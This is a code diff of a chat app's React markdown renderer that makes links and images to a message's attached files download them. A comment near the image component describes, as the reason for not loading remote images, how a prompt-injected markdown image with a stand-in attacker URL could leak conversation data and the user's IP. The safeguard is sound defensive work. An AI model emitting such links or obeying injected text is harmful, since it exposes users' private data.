@@ -1,4 +1,4 @@
-import { memo, useEffect, useMemo, useRef, useState, type ComponentProps } from 'react'
+import { memo, useContext, useEffect, useMemo, useRef, useState, type ComponentProps } from 'react'
 import ReactMarkdown, { type Components, type Options, type UrlTransform } from 'react-markdown'
 import remarkGfm from 'remark-gfm'
 import remarkMath from 'remark-math'
@@ -9,8 +9,9 @@ import { QUIZ_LANGUAGE } from '@pulpo/client-core/quiz'
 import 'katex/dist/katex.min.css'
 import { HighlightedCode } from '@/components/chat/HighlightedCode'
 import { MarkdownStreamingContext } from '@/components/chat/markdown-streaming'
+import { isWorkspaceFileLink, keepFileLinks, linkedAttachment, MarkdownAttachmentsContext } from '@/components/chat/markdown-file-links'
 import { QuizBlock } from '@/components/chat/QuizBlock'
-import { ui } from '@/i18n/ui'
+import { ui, uit } from '@/i18n/ui'
 import { writeClipboardText } from '@/lib/clipboard'
 import { codeFileExtension, downloadCode } from '@/lib/code-download'
 import { previewKindForLanguage, previewTitle } from '@/lib/code-preview'
@@ -78,11 +79,29 @@ function imageHost(src: string): string | null {
   }
 }
 
+const IMAGE_CHIP_CLASS = 'inline-flex max-w-full items-center gap-1 rounded-md border bg-muted/50 px-1.5 py-0.5 align-baseline text-[0.9em] no-underline'
+
 // Remote images load without a click, so a prompt-injected `![](https://attacker/?d=...)` would
 // leak conversation data and the user's IP. Render them as links the user can choose to open.
 function MarkdownImage({ src, alt }: ComponentProps<'img'>) {
+  const files = useContext(MarkdownAttachmentsContext)
   const href = typeof src === 'string' ? src : ''
   if (!href) return alt ? <>{alt}</> : null
+  const label = (
+    <>
+      <ImageIcon className="size-3.5 shrink-0 text-muted-foreground" aria-hidden="true" />
+      <span className="min-w-0 truncate">{alt || ui("Image")}</span>
+    </>
+  )
+  const attachment = files ? linkedAttachment(href, files.attachments) : null
+  if (files && attachment) {
+    return (
+      <button type="button" onClick={() => files.download(attachment)} title={uit`Download ${attachment.name}`} className={`${IMAGE_CHIP_CLASS} cursor-pointer hover:bg-muted`}>
+        {label}
+      </button>
+    )
+  }
+  if (isWorkspaceFileLink(href)) return <span className={IMAGE_CHIP_CLASS}>{label}</span>
   const host = imageHost(href)
   return (
     <a
@@ -90,11 +109,32 @@ function MarkdownImage({ src, alt }: ComponentProps<'img'>) {
       target="_blank"
       rel="noopener noreferrer"
       title={href}
-      className="inline-flex max-w-full items-center gap-1 rounded-md border bg-muted/50 px-1.5 py-0.5 align-baseline text-[0.9em] no-underline hover:bg-muted"
+      className={`${IMAGE_CHIP_CLASS} hover:bg-muted`}
     >
-      <ImageIcon className="size-3.5 shrink-0 text-muted-foreground" aria-hidden="true" />
-      <span className="min-w-0 truncate">{alt || ui("Image")}</span>
+      {label}
       {host && <span className="shrink-0 text-muted-foreground">· {host}</span>}
+    </a>
+  )
+}
+
+const LINK_CLASS = 'font-medium [overflow-wrap:anywhere] underline underline-offset-2 hover:text-muted-foreground'
+
+// Links to the message's own files download them. Links to files that weren't attached, and links
+// react-markdown blanked as unsafe, degrade to plain text rather than reopening the chat.
+function MarkdownLink({ children, href }: ComponentProps<'a'>) {
+  const files = useContext(MarkdownAttachmentsContext)
+  const attachment = files ? linkedAttachment(href, files.attachments) : null
+  if (files && attachment) {
+    return (
+      <button type="button" onClick={() => files.download(attachment)} title={uit`Download ${attachment.name}`} className={`cursor-pointer ${LINK_CLASS}`}>
+        {children}
+      </button>
+    )
+  }
+  if (!href || isWorkspaceFileLink(href)) return <span>{children}</span>
+  return (
+    <a href={href} target="_blank" rel="noreferrer" className={LINK_CLASS}>
+      {children}
     </a>
   )
 }
@@ -138,16 +178,7 @@ const markdownComponents: Components = {
       {children}
     </blockquote>
   ),
-  a: ({ children, href }) => (
-    <a
-      href={href}
-      target="_blank"
-      rel="noreferrer"
-      className="font-medium [overflow-wrap:anywhere] underline underline-offset-2 hover:text-muted-foreground"
-    >
-      {children}
-    </a>
-  ),
+  a: MarkdownLink,
   table: ({ children }) => (
     <div className="my-3 max-w-full overflow-x-auto rounded-lg border">
       <table className="min-w-full text-sm">{children}</table>
@@ -197,7 +228,7 @@ export const Markdown = memo(function Markdown({
   caret = false,
   breaks = false,
   components,
-  urlTransform,
+  urlTransform = keepFileLinks,
 }: {
   content: string
   streaming?: boolean
